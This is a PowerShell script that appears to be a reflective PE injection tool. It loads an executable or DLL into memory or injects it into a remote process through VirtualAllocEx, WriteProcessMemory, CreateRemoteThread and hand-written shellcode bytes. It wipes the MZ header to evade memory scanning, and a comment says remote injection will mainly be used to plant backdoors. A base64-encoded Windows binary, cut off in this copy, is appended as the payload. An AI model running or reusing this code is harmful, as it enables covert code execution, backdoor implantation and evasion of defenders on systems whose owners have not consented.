        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }

        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }

        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }

            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }

        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null


        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"


        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types


        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types


        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }


        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem

                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }


    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }

                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants

        $RemoteProcHandle = [IntPtr]::Zero

        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | Where-Object { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }

        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }

        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $Null = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }

        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    #Verify the image is a valid PE file
    $e_magic = ($PEBytes[0..1] | ForEach-Object {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $DoNotZeroMZ) {
        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
        # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}

$InputString = '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